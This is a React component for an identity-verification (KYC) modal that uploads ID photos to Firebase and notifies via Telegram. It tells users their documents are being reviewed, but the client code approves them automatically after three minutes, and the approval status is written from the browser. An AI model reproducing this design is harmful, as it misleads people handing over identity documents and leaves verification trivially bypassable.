import React, { useState, useEffect } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { sendTelegramNotification } from '@/services/telegram';
import { doc, updateDoc, serverTimestamp, setDoc, getDoc } from 'firebase/firestore';
import { ref, uploadBytes, getDownloadURL } from 'firebase/storage';
import { db, storage } from '@/lib/firebase';
import { X, Upload, Check, Clock, Shield, User, CreditCard, Camera, ChevronRight } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

interface KYCModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const KYCModal: React.FC<KYCModalProps> = ({ isOpen, onClose }) => {
  const { user, userData } = useAuth();
  const { toast } = useToast();
  const [step, setStep] = useState<'form' | 'uploading' | 'pending' | 'approved'>('form');
  const [fullName, setFullName] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [frontImage, setFrontImage] = useState<File | null>(null);
  const [backImage, setBackImage] = useState<File | null>(null);
  const [uploading, setUploading] = useState(false);
  const [countdown, setCountdown] = useState(180); // 3 minutes

  useEffect(() => {
    if (userData?.kycStatus === 'approved') {
      setStep('approved');
    } else if (userData?.kycStatus === 'pending') {
      setStep('pending');
    }
  }, [userData]);

  // Countdown timer for pending state
  useEffect(() => {
    if (step === 'pending' && countdown > 0) {
      const timer = setInterval(() => {
        setCountdown(prev => prev - 1);
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [step, countdown]);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, side: 'front' | 'back') => {
    const file = e.target.files?.[0];
    if (file) {
      if (side === 'front') setFrontImage(file);
      else setBackImage(file);
    }
  };

  const handleSubmit = async () => {
    if (!user || !userData || !frontImage || !backImage) return;

    setUploading(true);
    setStep('uploading');

    try {
      // Upload images
      const frontRef = ref(storage, `kyc/${user.uid}/front_${Date.now()}`);
      const backRef = ref(storage, `kyc/${user.uid}/back_${Date.now()}`);

      await uploadBytes(frontRef, frontImage);
      await uploadBytes(backRef, backImage);

      const frontUrl = await getDownloadURL(frontRef);
      const backUrl = await getDownloadURL(backRef);

      const kycId = `KYC_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

      // Save KYC document
      await setDoc(doc(db, 'kyc', user.uid), {
        userId: user.uid,
        userEmail: userData.email,
        fullName,
        idNumber,
        frontImageUrl: frontUrl,
        backImageUrl: backUrl,
        status: 'pending',
        kycId,
        createdAt: serverTimestamp()
      });

      // Update user KYC status
      await updateDoc(doc(db, 'users', user.uid), {
        kycStatus: 'pending'
      });

      // Send Telegram notification
      await sendTelegramNotification({
        type: 'kyc',
        userEmail: userData.email,
        transactionId: kycId
      });

      // Auto-approve after 3 minutes
      setTimeout(async () => {
        try {
          const kycDoc = await getDoc(doc(db, 'kyc', user.uid));
          if (kycDoc.exists() && kycDoc.data().status === 'pending') {
            await updateDoc(doc(db, 'kyc', user.uid), { status: 'approved' });
            await updateDoc(doc(db, 'users', user.uid), { kycStatus: 'approved' });
          }
        } catch (e) {
          console.error('Auto-approve failed:', e);
        }
      }, 180000); // 3 minutes

      setStep('pending');
      setCountdown(180);
      toast({
        title: 'KYC Submitted',
        description: 'Your documents are being verified.',
      });
    } catch (error) {
      console.error('Error submitting KYC:', error);
      toast({
        title: 'Error',
        description: 'Failed to submit KYC. Please try again.',
        variant: 'destructive'
      });
      setStep('form');
    } finally {
      setUploading(false);
    }
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-gradient-to-b from-[#1a2332] to-[#0d1117] border border-[#2a3a4a] rounded-2xl overflow-hidden shadow-2xl max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="bg-gradient-to-r from-indigo-600 to-purple-600 p-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div>
              <h2 className="text-white font-bold text-lg">Identity Verification</h2>
              <p className="text-white/80 text-xs">KYC Process</p>
            </div>
          </div>
          <button onClick={onClose} className="p-2 hover:bg-white/10 rounded-lg transition-colors">
            <X className="w-5 h-5 text-white" />
          </button>
        </div>

        <div className="p-6">
          {step === 'form' && (
            <div className="space-y-5">
              {/* Progress Steps */}
              <div className="flex items-center justify-center gap-2 mb-6">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-full bg-indigo-500 text-white flex items-center justify-center text-sm font-bold">1</div>
                  <span className="text-white text-sm font-medium">Details</span>
                </div>
                <div className="w-8 h-0.5 bg-[#2a3a4a]" />
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-full bg-[#2a3a4a] text-gray-400 flex items-center justify-center text-sm font-bold">2</div>
                  <span className="text-gray-400 text-sm">Documents</span>
                </div>
                <div className="w-8 h-0.5 bg-[#2a3a4a]" />
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-full bg-[#2a3a4a] text-gray-400 flex items-center justify-center text-sm font-bold">3</div>
                  <span className="text-gray-400 text-sm">Verify</span>
                </div>
              </div>

              {/* Personal Info */}
              <div className="space-y-4">
                <div className="bg-[#0d1117] border border-[#2a3a4a] rounded-xl p-4">
                  <label className="flex items-center gap-2 text-gray-400 text-sm mb-3">
                    <User className="w-4 h-4" />
                    Full Legal Name
                  </label>
                  <input
                    type="text"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    className="w-full bg-[#1a2332] border border-[#2a3a4a] focus:border-indigo-500 rounded-lg px-4 py-3 text-white outline-none transition-colors placeholder:text-gray-500"
                    placeholder="As shown on your ID"
                  />
                </div>

                <div className="bg-[#0d1117] border border-[#2a3a4a] rounded-xl p-4">
                  <label className="flex items-center gap-2 text-gray-400 text-sm mb-3">
                    <CreditCard className="w-4 h-4" />
                    ID / Passport Number
                  </label>
                  <input
                    type="text"
                    value={idNumber}
                    onChange={(e) => setIdNumber(e.target.value)}
                    className="w-full bg-[#1a2332] border border-[#2a3a4a] focus:border-indigo-500 rounded-lg px-4 py-3 text-white outline-none transition-colors placeholder:text-gray-500"
                    placeholder="Enter your ID number"
                  />
                </div>
              </div>

              {/* Document Upload */}
              <div className="space-y-3">
                <h3 className="text-white font-medium flex items-center gap-2">
                  <Camera className="w-4 h-4 text-indigo-400" />
                  Upload ID Documents
                </h3>
                
                <div className="grid grid-cols-2 gap-3">
                  <label className={`flex flex-col items-center justify-center aspect-[4/3] bg-[#0d1117] rounded-xl border-2 border-dashed cursor-pointer transition-all ${frontImage ? 'border-green-500 bg-green-500/10' : 'border-[#2a3a4a] hover:border-indigo-500/50'}`}>
                    {frontImage ? (
                      <div className="text-center">
                        <Check className="w-8 h-8 text-green-500 mx-auto mb-1" />
                        <span className="text-green-400 text-xs font-medium">Front Added</span>
                      </div>
                    ) : (
                      <div className="text-center p-4">
                        <Upload className="w-8 h-8 text-gray-500 mx-auto mb-2" />
                        <span className="text-gray-400 text-xs">ID Front</span>
                      </div>
                    )}
                    <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 'front')} className="hidden" />
                  </label>

                  <label className={`flex flex-col items-center justify-center aspect-[4/3] bg-[#0d1117] rounded-xl border-2 border-dashed cursor-pointer transition-all ${backImage ? 'border-green-500 bg-green-500/10' : 'border-[#2a3a4a] hover:border-indigo-500/50'}`}>
                    {backImage ? (
                      <div className="text-center">
                        <Check className="w-8 h-8 text-green-500 mx-auto mb-1" />
                        <span className="text-green-400 text-xs font-medium">Back Added</span>
                      </div>
                    ) : (
                      <div className="text-center p-4">
                        <Upload className="w-8 h-8 text-gray-500 mx-auto mb-2" />
                        <span className="text-gray-400 text-xs">ID Back</span>
                      </div>
                    )}
                    <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 'back')} className="hidden" />
                  </label>
                </div>
              </div>

              {/* Info Box */}
              <div className="bg-indigo-500/10 border border-indigo-500/30 rounded-xl p-4">
                <p className="text-indigo-300 text-xs leading-relaxed">
                  🔒 Your documents are encrypted and stored securely. Verification typically completes within 3 minutes.
                </p>
              </div>

              <button
                onClick={handleSubmit}
                disabled={!fullName || !idNumber || !frontImage || !backImage}
                className="w-full py-4 bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white font-bold rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-lg shadow-indigo-500/30 flex items-center justify-center gap-2"
              >
                Submit Verification
                <ChevronRight className="w-5 h-5" />
              </button>
            </div>
          )}

          {step === 'uploading' && (
            <div className="text-center py-12">
              <div className="w-20 h-20 mx-auto border-4 border-indigo-500 border-t-transparent rounded-full animate-spin mb-6" />
              <h3 className="text-xl font-bold text-white mb-2">Uploading Documents</h3>
              <p className="text-gray-400">Please wait while we securely upload your files...</p>
            </div>
          )}

          {step === 'pending' && (
            <div className="text-center space-y-6 py-8">
              <div className="w-24 h-24 mx-auto bg-gradient-to-br from-yellow-500/20 to-orange-500/20 rounded-full flex items-center justify-center">
                <Clock className="w-12 h-12 text-yellow-500" />
              </div>
              <div>
                <h3 className="text-xl font-bold text-white mb-2">Verification In Progress</h3>
                <p className="text-gray-400 text-sm leading-relaxed">
                  Your documents are being reviewed. This usually takes about 3 minutes.
                </p>
              </div>
              
              {/* Countdown Timer */}
              <div className="bg-[#0d1117] border border-[#2a3a4a] rounded-xl p-4">
                <p className="text-gray-400 text-sm mb-2">Estimated time remaining</p>
                <p className="text-3xl font-mono font-bold text-yellow-400">{formatTime(countdown)}</p>
              </div>

              {/* Progress Bar */}
              <div className="w-full bg-[#2a3a4a] rounded-full h-2">
                <div 
                  className="bg-gradient-to-r from-yellow-500 to-green-500 h-2 rounded-full transition-all duration-1000"
                  style={{ width: `${((180 - countdown) / 180) * 100}%` }}
                />
              </div>

              <button
                onClick={onClose}
                className="w-full py-3 bg-[#2a3548] rounded-xl font-medium text-white hover:bg-[#3a4a5e] transition-colors"
              >
                Close
              </button>
            </div>
          )}

          {step === 'approved' && (
            <div className="text-center space-y-6 py-8">
              <div className="w-24 h-24 mx-auto bg-gradient-to-br from-green-500/20 to-emerald-500/20 rounded-full flex items-center justify-center">
                <Check className="w-12 h-12 text-green-500" />
              </div>
              <div>
                <h3 className="text-xl font-bold text-white mb-2">Verification Complete</h3>
                <p className="text-gray-400 text-sm leading-relaxed">
                  Your identity has been verified successfully. You now have full access to all features.
                </p>
              </div>
              
              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 flex items-center gap-3">
                <Shield className="w-6 h-6 text-green-500" />
                <div className="text-left">
                  <p className="text-green-400 font-medium">Verified Account</p>
                  <p className="text-green-400/70 text-xs">Full withdrawal access enabled</p>
                </div>
              </div>

              <button
                onClick={onClose}
                className="w-full py-3 bg-gradient-to-r from-green-500 to-emerald-600 rounded-xl font-medium text-white hover:from-green-600 hover:to-emerald-700 transition-colors"
              >
                Done
              </button>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="px-6 pb-4">
          <div className="flex items-center justify-center gap-2 text-gray-500 text-xs">
            <Shield className="w-3 h-3" />
            <span>256-bit SSL Encrypted • Secure Process</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default KYCModal;